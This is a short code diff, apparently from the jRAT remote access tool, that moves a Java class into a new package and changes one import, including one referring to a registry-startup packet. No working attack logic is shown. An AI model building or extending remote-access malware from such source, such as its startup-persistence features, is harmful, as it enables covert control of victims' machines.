@@ -1,7 +1,7 @@
-package jrat.client.packets.incoming;
+package jrat.module.system.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.Packet53RegistryStartup;
+import jrat.client.packets.incoming.IncomingPacket;
 import oslib.OperatingSystem;
 
 import java.io.BufferedReader;
